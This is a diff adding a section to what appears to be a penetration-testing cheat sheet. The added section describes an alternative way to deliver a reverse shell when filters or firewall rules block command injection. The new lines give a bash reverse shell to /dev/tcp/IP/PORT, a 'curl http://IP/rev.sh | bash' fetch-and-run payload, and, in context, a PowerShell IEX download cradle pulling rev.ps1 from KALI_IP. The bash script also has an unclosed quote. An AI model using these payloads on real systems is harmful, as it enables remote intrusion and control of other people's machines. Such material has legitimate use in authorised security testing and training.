@@ -970,6 +970,18 @@ There are multiple ways to do so:
     Also check the file permission and ownership with `ls -la` to see if 
     the file is owned the by process owner
 
+### Execute reverse shell payload alternative
+If you can't execute the reverse shell payload directly 
+(maybe some sort of fiilters or firewall rules exist and preventing command injection payload),
+try saving you payload into a script file and serving your payload through a http server. 
+An example payload `rev.sh` will be like
+```
+#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1
+```
+Then on the server side, use `curl http://IP/rev.sh | bash` 
+or similar tool as your injection payload.
+
 ### Starting a windows conptyshell in background (can use it via a web shell to call conptyshell directly)
 ```cmd
 start /B powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/rev.ps1')"
